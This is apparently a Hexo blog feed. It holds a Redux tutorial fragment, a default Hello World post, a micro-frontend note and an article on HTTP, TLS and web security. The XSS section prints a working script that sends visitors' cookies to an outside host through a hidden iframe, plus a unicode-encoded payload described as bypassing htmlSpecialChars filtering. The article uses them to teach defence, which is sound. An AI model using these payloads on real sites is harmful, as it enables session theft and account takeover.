<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&quot;../store&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;INCREMENT, DECREMENT&#125; <span class="keyword">from</span> <span class="string">&#x27;../constant&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createIncrementAction = <span class="function"><span class="params">data</span> =&gt;</span> (&#123;<span class="attr">type</span>:INCREMENT, data&#125;);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createDecrementAction = <span class="function"><span class="params">data</span> =&gt;</span> (&#123;<span class="attr">type</span>:DECREMENT, data&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createIncrementAsyncAction = <span class="function">(<span class="params">data, time</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            store.dispatch(&#123;<span class="attr">type</span>:INCREMENT, data&#125;)</span><br><span class="line">        &#125;, time)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="步骤四——编写reducer"><a href="#步骤四——编写reducer" class="headerlink" title="步骤四——编写reducer"></a>步骤四——编写reducer</h3><p><strong>reducer负责维护状态。</strong>编写reducer函数，需要设置初始化的状态值，并对函数传入<code>action</code>参数，根据<code>action</code>对象的<code>type</code>和<code>data</code>对状态进行操作，并返回操作后的状态。</p>
<p>实例如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> initNumber = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">countReducer</span>(<span class="params">preState=initNumber, action</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;type, data&#125; = action;</span><br><span class="line">    <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;increment&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> preState + data;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;decrement&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> preState - data;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> preState;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p>至此，redux部分的基本三大件已经写完。接下来需要编写组建模块。</p>
<h3 id="步骤五——编写Container-Component"><a href="#步骤五——编写Container-Component" class="headerlink" title="步骤五——编写Container/Component"></a>步骤五——编写Container/Component</h3><p>首先，引入<code>action</code>，并从<code>react-redux</code>中引入<code>connect</code>函数，该函数用于创建并暴露一个Container容器，同时将state和action传入组件中，并且它们都会被传入到组件自身的<code>prorps</code>属性中。实例如下：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="comment">// 引入connect</span></span><br><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">&#x27;react-redux&#x27;</span></span><br><span class="line"><span class="comment">// 引入action</span></span><br><span class="line"><span class="keyword">import</span> &#123;createIncrementAction, createDecrementAction, createIncrementAsyncAction&#125; <span class="keyword">from</span> <span class="string">&#x27;../../redux/actions/count&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Count</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(</span><br><span class="line">  	<span class="comment">// 传入state</span></span><br><span class="line">    state =&gt; (&#123;<span class="attr">count</span>: state.count, <span class="attr">people</span>: state.people&#125;),</span><br><span class="line">  	<span class="comment">// 传入action</span></span><br><span class="line">    &#123;<span class="attr">increment</span>: createIncrementAction,</span><br><span class="line">     decrement: createDecrementAction,</span><br><span class="line">     asyncIncrement: createIncrementAsyncAction</span><br><span class="line">    &#125;</span><br><span class="line">    )(Count)</span><br></pre></td></tr></table></figure>
































]]></content>
      <categories>
        <category>FrontEnd/前端</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/en/2021/02/14/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>前端知识-杂谈</title>
    <url>/en/2021/09/21/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86-%E6%9D%82%E8%B0%88/</url>
    <content><![CDATA[<h2 id="前端趋势"><a href="#前端趋势" class="headerlink" title="前端趋势"></a>前端趋势</h2><p>目前有走向微前端的趋势，所谓微前端的提出，可以说是在MPA（多页）和SPA（单页）之间的折中，现今大多数网站都采用SPA，然而随着时间的推移，SPA内的东西越来越多，并且由于各部分之间的耦合性，使得维护成本越来越高。</p>
<a id="more"></a>

<p>因此微前端的概念被提出，即降低内部的耦合性，实现类似高内聚低耦合的效果。目前流行的有Web-Component，将网页各部分模块化，各模块之间互不干扰，独立工作（例如各模块甚至可以使用不同的编程语言来编写）。（PS: 这一概念可以与后端的微服务对比参考）</p>
]]></content>
      <categories>
        <category>FrontEnd/前端</category>
      </categories>
      <tags>
        <tag>CONCEPT</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/en/2022/02/17/HTTP%20&amp;%20Network/</url>
    <content><![CDATA[<hr>
<p>title: HTTP &amp; Network Security<br>date: 2021-12-06<br>categories: Network<br>tags: [HTTP]<br>comments: false<br>summary_img: … /cover/https.svg</p>
<p>**This article focuses on some common computer networking concepts and summarizes them for future in-depth understanding of web development. **</p>
<p>&lt;! –more–&gt;</p>
<h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h2 id="HTTP-Protocol"><a href="#HTTP-Protocol" class="headerlink" title="HTTP Protocol"></a>HTTP Protocol</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>HTTP is a TCP/IP based <strong>application layer protocol</strong>. It does not involve the transmission of datagrams, but mainly specifies the format of communication between the client and the server, and uses port 80 by default.</p>
<h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><h4 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h4><ul>
<li><p>1996 - Released</p>
</li>
<li><p>Version 1.0 introduced the POST and HEAD commands in addition to the GET command, which was the only one available in version 0.9.</p>
</li>
<li><p>HTTP request and response formats, in addition to including <strong>data sections</strong> must also include <strong>header information i.e. HTTP HEADER</strong> (to describe metadata)</p>
</li>
</ul>
<h4 id="request-format"><a href="#request-format" class="headerlink" title="request format"></a>request format</h4><p>Request command + multi-line headers</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.0 request command</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_10_5) Multi-line headers</span><br><span class="line">Accept: *&#x2F;* Multi-line headers</span><br></pre></td></tr></table></figure>
<h4 id="Response-format"><a href="#Response-format" class="headerlink" title="Response format"></a>Response format</h4><p>Header + blank line + data. First line is protocol version + status code + status description</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.0 200 OK first line</span><br><span class="line">Content-Type: text&#x2F;plain from here onwards is the header</span><br><span class="line">Content-Length: 137582</span><br><span class="line">Expires: Thu, 05 Dec 1997 16:00:00 GMT</span><br><span class="line">Last-Modified: Wed, 5 August 1996 15:55:28 GMT</span><br><span class="line">Server: Apache 0.84</span><br><span class="line">        											This is a blank line</span><br><span class="line">&lt;html&gt; Data from here onwards</span><br><span class="line">  &lt;body&gt;Hello World&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h4 id="Content-Type-field"><a href="#Content-Type-field" class="headerlink" title="Content-Type field"></a>Content-Type field</h4><p>The headers are ASCII, but the data can be in any format. Therefore <strong><code>Content-Type</code> is needed to tell the client the format of this data</strong>.</p>
<p>Common <code>Content-Type</code> field values are as follows.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x2F;plain</span><br><span class="line">text&#x2F;html</span><br><span class="line">text&#x2F;css</span><br><span class="line">image&#x2F;jpeg</span><br><span class="line">image&#x2F;png</span><br><span class="line">image&#x2F;svg+xml</span><br><span class="line">audio&#x2F;mp4</span><br><span class="line">video&#x2F;mp4</span><br><span class="line">application&#x2F;javascript</span><br><span class="line">application&#x2F;pdf</span><br><span class="line">application&#x2F;zip</span><br><span class="line">application&#x2F;atom+xml</span><br></pre></td></tr></table></figure>
<p>These data types are collectively known as <strong>MIME type</strong> and are in the format: primary type/secondary type.</p>
<h4 id="Content-Encoding-field"><a href="#Content-Encoding-field" class="headerlink" title="Content-Encoding field"></a>Content-Encoding field</h4><p>As <strong>the data sent can be in any format</strong>, it is possible to compress the data before sending it. The <strong><code>Content-Encoding</code> field describes how the data is compressed</strong>. Common compression methods.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Encoding: compress</span><br><span class="line">Content-Encoding: deflate</span><br></pre></td></tr></table></figure>
<p>Also** when the client requests**, it can specify the compression method it <strong>accepts</strong>, using the <strong>field <code>Accept-Encoding</code></strong>. as follows.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>
<h4 id="Disadvantages"><a href="#Disadvantages" class="headerlink" title="Disadvantages"></a>Disadvantages</h4><p>The main problem with HTTP/1.0 is that: <strong>only one request can be sent per TCP connection</strong>. Once the data is sent, the link is closed. To request another resource, another TCP connection must be created. The TCP connection requires three handshakes between the client and the server, and starts off slowly due to slow start, making it costly to create a new TCP connection.</p>
<p>** To solve this problem, some browsers use the non-standard field <code>Connection</code>. **</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
<p>The above field requires the server not to close the TCP connection so that other requests can reuse it, and that reusable TCP connection will not be disconnected until either the client or the server actively closes it. However, this method is not standard.</p>
<h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>Used from 1997 to 201 several, until HTTPS.</p>
<h4 id="Persistent-connections"><a href="#Persistent-connections" class="headerlink" title="Persistent connections"></a>Persistent connections</h4><ul>
<li>The <strong>biggest change</strong> in version 1.1 was the introduction of <strong>persistent connection</strong>, i.e. TCP connections are not closed by default, can be reused by multiple requests and do not need to declare <code>Connection:keep-alive</code>.</li>
<li>A connection is actively closed when there has been no communication between the client and the server for a period of time. However, the normative practice is for the client to send <code>Connection: close</code> on the last request, explicitly asking the server to close the TCP connection.</li>
</ul>
<p>**Note: **For the same domain name, most browsers allow <strong>6 persistent connections</strong> to be established at the same time.</p>
<h4 id="Pipeline-mechanism"><a href="#Pipeline-mechanism" class="headerlink" title="Pipeline mechanism"></a>Pipeline mechanism</h4><p>In version 1.0, within the same TCP connection, if a client wanted to <strong>request two resources</strong>, it would <strong>send request A</strong> first, then wait for the server to respond, <strong>and then send request B</strong> after receiving the response**.</p>
<p>In version 1.1 the <strong>pipelining</strong> mechanism was introduced, which allows the browser to <strong>send both an A request and a B request</strong>, but the server still responds to the A request first, in order, and then to the B request when it is done.</p>
<p>Thus, the pipelining mechanism allows <strong>clients to send multiple requests</strong> at the same time over the same TCP connection.</p>
<h4 id="Content-Length-field"><a href="#Content-Length-field" class="headerlink" title="Content-Length field"></a>Content-Length field</h4><p>** Used to declare the length of the data for this response. **</p>
<h4 id="chunked-transfer-encoding"><a href="#chunked-transfer-encoding" class="headerlink" title="chunked-transfer-encoding"></a>chunked-transfer-encoding</h4><p>In short, it means that the server <strong>sends a piece of data as it is generated</strong>, i.e. it uses the stream mode instead of the buffer mode.</p>
<p>Therefore, version 1.1 can use chunked transfer encoding instead of the <code>Content-Length</code> field. Whenever <strong>a request or response has a <code>Transfer-Encoding</code> field</strong> in its header, it indicates that the response will consist of an undetermined number of chunks of data.</p>
<p><strong>Note:</strong> Each non-empty block of data will be preceded by a hexadecimal value to indicate the length of the block. It ends with a block of size 0, indicating that the data for this response has been sent. Examples are as follows.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25</span><br><span class="line">This is the data in the first chunk</span><br><span class="line"></span><br><span class="line">1C</span><br><span class="line">and this is the second one</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">con</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">sequence</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<h4 id="Other-features"><a href="#Other-features" class="headerlink" title="Other features"></a>Other features</h4><ul>
<li>Version 1.1 also adds many new verb methods such as <code>PUT</code>, <code>PATCH</code>, <code>HEAD</code>, <code>OPTIONS</code>, <code>DELETE</code></li>
<li>A new <code>HOST</code> field** has been added to the client request headers to specify the server’s domain name. With the <code>HOST</code> field it is possible to send a request to a different website on the same server. (Laying the groundwork for the rise of virtual machines)</li>
</ul>
<h4 id="Disadvantages-1"><a href="#Disadvantages-1" class="headerlink" title="Disadvantages"></a>Disadvantages</h4><p>There is <strong>Head-of-line blocking</strong>. Although multiplexing of TCP connections is allowed, data communication within the <strong>same TCP connection is still sequential</strong> and the server can only respond to the next request after processing the response to the first one. If the response to the previous request is slow, then there will be many requests queued up behind it.</p>
<p>Ways to avoid queue head blocking are.</p>
<ol>
<li><strong>reduce the number of requests</strong>. For example, merging scripts and stylesheets, embedding images in CSS code</li>
<li><strong>Multiple simultaneous persistent connections</strong>. For example, domain sharding, where the required downloads can come from multiple domains, can solve the concurrency limit.</li>
</ol>
<h3 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP/2"></a>HTTP/2</h3><h4 id="Binary-protocol"><a href="#Binary-protocol" class="headerlink" title="Binary protocol"></a>Binary protocol</h4><p>HTTP/1.1 has a text (ASCII) header and a text or binary data body. HTTP/2, however, is a <strong>thoroughly binary protocol</strong>, where both the header and the data body are binary, and are collectively referred to as “frames”: header frames and data frames.</p>
<p>The advantage of the binary protocol is that additional frames can be defined.</p>
<h4 id="Multiplexing"><a href="#Multiplexing" class="headerlink" title="Multiplexing"></a>Multiplexing</h4><p>In HTTP/2, both the client and the browser can send multiple requests and responses at the same time over the same TCP connection, without having to correspond to each other in order, thus avoiding the problem of queue head blocking.</p>
<p>For example, in a TCP connection, the server receives both request A and request B. It responds to request A first, which turns out to be very time-consuming to process, so it sends the part of request A that has already been processed, then processes the response to request B, and when it’s done, it processes the rest of the request that sent A. We call this <strong>duplex, real-time communication</strong> <strong>multiplex</strong>.</p>
<h4 id="data-flow"><a href="#data-flow" class="headerlink" title="data flow"></a>data flow</h4><p>In HTTP/2, <strong>packets are sent out of order</strong>; consecutive packets inside the same connection may belong to different responses, so it is necessary to <strong>mark</strong> the packet to indicate which response it belongs to.</p>
<p>HTTP/2 refers to <strong>all packets</strong> of each request or response as a <strong>stream</strong>. Each stream is given a unique number. When a packet is sent, it must be marked with a stream ID that identifies which stream it belongs to. In addition, all stream IDs sent by the client are odd numbers and all stream IDs sent by the server are even numbers.</p>
<p>When the stream is sent halfway, both the client and the server can signal the stream to be cancelled. In HTTP/1.1, the only way to cancel a stream was to close the TCP connection. HTTP/2 can cancel a request while ensuring that the TCP connection is still open and can be reused for other requests.</p>
<p>The client can also specify the priority of the data stream, the higher the priority the sooner the server will respond to it.</p>
<h4 id="header-compression"><a href="#header-compression" class="headerlink" title="header compression"></a>header compression</h4><p>As many fields in the <strong>request headers are repeated in each request</strong> (e.g. Cookie, User Agent, etc.), this can result in a lot of wasted bandwidth. HTTP/2 optimises this by introducing <strong>header compression</strong>. On the one hand, headers <strong>are compressed using methods such as <code>gzip</code></strong> before being sent; on the other hand, the client and server maintain a <strong>header table</strong> which is a mapping of <strong>fields and index numbers</strong>, after which only the index numbers are sent to improve speed.</p>
<h4 id="Server-Push"><a href="#Server-Push" class="headerlink" title="Server Push"></a>Server Push</h4><p>HTTP/2 allows the server to send resources to the client unsolicited without receiving a request.</p>
<p>For example, if a client requests a web page containing many static resources, the server will actively send these static resources to the client along with the web page, so that there is no need to wait for the client to receive the web page and parse the HTML to find static resources before requesting static resources.</p>
<h2 id="HTTPS-Extra"><a href="#HTTPS-Extra" class="headerlink" title="HTTPS - Extra"></a>HTTPS - Extra</h2><p>The security of Internet communications is built on the <strong>SSL/TLS</strong> protocol.</p>
<p><strong>Note</strong>: SSL - <strong>Secure Sockets Layer</strong>, TLS - an upgrade from SSL</p>
<h3 id="Reasons-for-using-HTTPS-amp-what-it-does"><a href="#Reasons-for-using-HTTPS-amp-what-it-does" class="headerlink" title="Reasons for using HTTPS &amp; what it does"></a>Reasons for using HTTPS &amp; what it does</h3><p><strong>Comparison:</strong></p>
<ul>
<li><p>HTTP does not use SSL/TLS and is therefore unencrypted communication, all information is transmitted in clear text</p>
<ol>
<li><strong>Eavesdropping risk:</strong> third parties can intercept and be informed of the content of communications</li>
<li><strong>tampering:</strong> third parties can intercept and modify the content of communications</li>
<li><strong>pretending:</strong> a third party can impersonate another person to participate in the communication</li>
</ol>
</li>
<li><p>Benefits of HTTPS based on SSL/TLS protocol</p>
<ol>
<li><strong>All messages are transmitted encrypted</strong> - no eavesdropping</li>
<li><strong>with a checksum mechanism</strong> - any tampering with the content of the communication can be detected by both parties to the communication</li>
<li><strong>Equipped with a certificate of identity</strong> - prevents identity impersonation</li>
</ol>
</li>
</ul>
<h3 id="The-basic-operation-of-the-SSL-TLS-protocol"><a href="#The-basic-operation-of-the-SSL-TLS-protocol" class="headerlink" title="The basic operation of the SSL/TLS protocol"></a>The basic operation of the SSL/TLS protocol</h3><p>The basic idea of the protocol is:** asymmetric encryption: public key encryption, private key decryption**. That is, the client first asks the server for the public key, then encrypts the message with the public key, and the server receives the ciphertext and decrypts it with its own private key.</p>
<ol>
<li><p><strong>How to ensure that the public key cannot be tampered with?</strong></p>
<p>Answer: <strong>Put the public key into the digital certificate</strong>, as long as the certificate is trusted, then the public key is trusted.</p>
</li>
<li><p><strong>How to reduce the time required for encryption with a public key that is too computationally intensive?</strong></p>
<p>Answer: For each conversation (session), the client and the server will generate a “conversation key” (session key), which will be used to encrypt the message. As the session key is a symmetric encryption, it is very fast, so if the server public key is only used to encrypt the session key itself, the time consumed for encryption is greatly reduced.</p>
</li>
</ol>
<p>So, the basic process of the SSL/TLS protocol is</p>
<ol>
<li>the client requests and verifies the public key <strong>from the server</strong> - the handshake phase</li>
<li>both parties negotiate <strong>to generate a “conversation key “</strong></li>
<li>both parties use the “conversation key “ <strong>for encrypted communication</strong></li>
</ol>
<h3 id="Handshake-phase"><a href="#Handshake-phase" class="headerlink" title="Handshake phase"></a>Handshake phase</h3><p>The handshake phase involves four communications and all communications during this phase are in plaintext.</p>
<h4 id="Phase-1-The-client-sends-a-request"><a href="#Phase-1-The-client-sends-a-request" class="headerlink" title="Phase 1: The client sends a request"></a>Phase 1: The client sends a request</h4><p>First, the client sends an encrypted communication request to the server. The request it sends is mainly about the following.</p>
<ol>
<li>the supported protocol version, e.g. TLS 1.0</li>
<li>a random number generated by the client to be used later to generate a “conversation key”</li>
<li>the encryption method supported, e.g. RSA public key encryption</li>
<li>supported compression methods</li>
</ol>
<h4 id="Phase-2-Server-Response"><a href="#Phase-2-Server-Response" class="headerlink" title="Phase 2: Server Response"></a>Phase 2: Server Response</h4><p>The server receives a request from the client and sends a response to the client. The response mainly includes the following.</p>
<ol>
<li>confirmation of the version of the encrypted communication protocol used. If the two sides do not support the same version, the server will close this encrypted communication</li>
<li>a random number generated by the server to be used later to generate the “conversation key”</li>
<li>confirmation of the encryption method used</li>
<li>the server certificate</li>
</ol>
<h4 id="Phase-3-Client-Response"><a href="#Phase-3-Client-Response" class="headerlink" title="Phase 3: Client Response"></a>Phase 3: Client Response</h4><p>When the client receives the response from the server, it first verifies the server’s digital certificate.</p>
<p>If <strong>1. the certificate is not credible. 2. the domain name in the certificate does not match the actual domain name. 3. the certificate has expired</strong>, a warning is displayed to the visitor, giving him/her the option to continue the communication or not.</p>
<p>If there is no problem with the certificate, the client will <strong>take the server’s public key</strong> from the certificate and send a response to the server with the following main contents.</p>
<ol>
<li>A random number generated by the client. The random number is encrypted with the public key to prevent eavesdropping.</li>
<li>A notification of the change in encoding. Indicates that subsequent messages will be sent using the mutually agreed encryption method and key.</li>
<li>client end of handshake notification. Indicates the end of the client’s handshake phase, this item is also the hash value of all content sent earlier and is used for server verification.</li>
</ol>
<p><strong>Note:</strong> The random number generated in this phase is the third random number (“pre-master key”) that appears throughout the handshake phase. With this, both the client and the server have three random numbers at the same time, and then each side generates the same “session key” for the session, using a pre-agreed encryption method.</p>
<h4 id="Phase-4-Final-server-response"><a href="#Phase-4-Final-server-response" class="headerlink" title="Phase 4: Final server response"></a>Phase 4: Final server response</h4><p>Once the server has received the third random number, it calculates and generates the “session key” for the current session. A final response is then sent to the client. The main contents are as follows.</p>
<ol>
<li>Notification of code change. This indicates that the subsequent message will be sent with the agreed encryption method and key. 2.</li>
<li>End of server handshake notification. Indicates that the handshake phase of the server has ended. This item is also the hash value of all the content sent earlier and is used for verification by the client.</li>
</ol>
<p>At this point, the entire handshake phase is complete. Next, the client and server communicate encrypted, which is <strong>exactly the same as the normal HTTP protocol</strong>, <strong>except that all sent content is encrypted using the “session key”</strong>.</p>
<h2 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h2><h3 id="XSS-Cross-Site-Scripting"><a href="#XSS-Cross-Site-Scripting" class="headerlink" title="XSS - Cross Site Scripting"></a>XSS - Cross Site Scripting</h3><h4 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h4><p>XSS, known as <strong>Cross-site scripting</strong>, or cross-site scripting in Chinese, is a type of <strong>attack</strong> on the security vulnerability of web applications, i.e. a type of <strong>code injection</strong>. This type of attack usually involves both HTML and user scripting languages (mainly JavaScript).</p>
<p>For example, posting a malicious piece of JavaScript code on a web forum in JavaScript is a script injection, while at the same time if the content of this code has the ability to request an external server, then it is called XSS.</p>
<p>Therefore, it can be understood as <strong>XSS (cross-site scripting) = script injection + the ability to request an external server</strong>.</p>
<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>For example, the following code is written for posting content in a forum site.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">  while (true) &#123;</span><br><span class="line">    alert(&#x27;keep popping up windows&#x27;)</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Assuming the forum site has no filtering or other defence mechanisms, any user visiting this thread will have this pop-up popping up all the time in the client interface.</p>
<p>**This is script injection in its simplest form. **Of course this script is not substantially more harmful then XSS is based on a script injection method to accomplish this, but it is injecting a script that contains a request for cross-site functionality.</p>
<p>For example, in the forum site mentioned above, the following code is injected.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">  (function(window, document) &#123;</span><br><span class="line">    // Construct the URL for the leaked information</span><br><span class="line">    var cookies = document.cookie;</span><br><span class="line">    var xssURIBase = &quot;http://192.168.123.123/myxss/&quot;;</span><br><span class="line">    var xssURI = xssURIBase + window.encodeURI(cookies);</span><br><span class="line">    // Create a hidden iframe for communication</span><br><span class="line">    var hideFrame = document.createElement(&quot;iframe&quot;);</span><br><span class="line">    hideFrame.height = 0;</span><br><span class="line">    hideFrame.width = 0;</span><br><span class="line">    hideFrame.style.display = &quot;none&quot;;</span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line">    // start</span><br><span class="line">    document.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(window, document);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>This code will pass the cookie of any user who visits the post to a server with the name <code>http://192.168.123.123/myxss/</code>, which can then take this cookie and visit the corresponding website and log into the user’s account, which can then perform other operations.</p>
<p>Therefore, the above code is XSS.</p>
<h3 id="CSRF-Cross-Site-Request-Forgery"><a href="#CSRF-Cross-Site-Request-Forgery" class="headerlink" title="CSRF - Cross Site Request Forgery"></a>CSRF - Cross Site Request Forgery</h3><h4 id="Introduction-3"><a href="#Introduction-3" class="headerlink" title="Introduction"></a>Introduction</h4><p>CSRF, known as <strong>Cross-site request forgery</strong>, is a form of cross-site request forgery. It is an attack method that allows a user to perform some unintended actions** (such as name change, post deletion, emailing, etc.) on a currently logged-in web application.</p>
<h4 id="Attack-Principle"><a href="#Attack-Principle" class="headerlink" title="Attack Principle"></a>Attack Principle</h4><p>Generally speaking, CSRF is implemented by XSS, on top of cross-site scripting, to implement forged requests, causing the victim to perform actions that he or she would not have intended to perform.</p>
<p>**Note: CSRF can also be implemented without XSS. **</p>
<h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><p>After the external server has successfully obtained the user’s cookie, it can use the cookie to forge a series of requests to the forum website, such as changing the user’s name, changing the user’s password, etc. At this point, the attack can be called a CSRF.</p>
<h3 id="Protection-against-XSS-and-CSRF-⭐️"><a href="#Protection-against-XSS-and-CSRF-⭐️" class="headerlink" title="Protection against XSS and CSRF ⭐️"></a>Protection against XSS and CSRF ⭐️</h3><p><em><strong>Core idea: don’t trust any external source data!!!</strong></em></p>
<p>Generally speaking, most CSRF is based on XSS, so it can be said that by defending against XSS, you are basically defending against CSRF as well.</p>
<p>For the prevention of XSS, there are two main methods as follows.</p>
<ol>
<li><strong>Input filtering: thorough sensitive character filtering of external input</strong> - front end + back end</li>
<li><strong>Output filtering: when displayed on the page, do some processing so that sensitive code scripts cannot be executed smoothly</strong> - front-end</li>
</ol>
<p>Theoretically, wherever there is input data, there is an XSS vulnerability. JavaScript scripts can be injected into the database in various forms (e.g. plaintext, encoded, etc.).</p>
<p>As mentioned above JS can be injected in a variety of illegal forms, the main illegal forms are of two types.</p>
<ol>
<li><p><strong>Plaintext:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  ... <span class="comment">// js malicious code</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>To handle the filtering of plaintext injections.</p>
</li>
<li><p><strong>Coding:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">u0026u006cu0074u003bu0073u0063u0072u0069u0070u0074u0026u0067u0074u003bu0061u006cu0065u0072u0074u0028u0026u0023u0033u0039u003bu6211u662fu0078u0073u0073uff0cu4f60u6709u9ebbu70e6u4e86u0026u0023u0033u0039u003bu0029u0026u006cu0074u003bu002fu0073u0063u0072u0069u0070u0074u0026u0067u0074u003b</span><br></pre></td></tr></table></figure>
<p>The above encoding is unicode, which bypasses the <code>htmlSpecialChars</code> filter and is imported into the library, and then when the message is displayed, the html automatically converts the unicode encoding into plaintext, i.e. a real executable script.</p>
